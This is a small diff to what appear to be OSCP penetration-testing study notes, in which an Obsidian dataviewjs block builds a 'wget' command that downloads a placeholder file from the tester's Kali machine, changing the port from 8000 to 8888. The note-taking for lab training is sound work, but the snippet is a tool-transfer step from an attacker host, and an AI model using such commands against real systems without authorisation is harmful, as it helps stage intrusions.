@@ -42,7 +42,7 @@ wget from local python server
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `wget http://${KaliIP}:8000/[file]`;
+const command = `wget http://${KaliIP}:8888/[file]`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
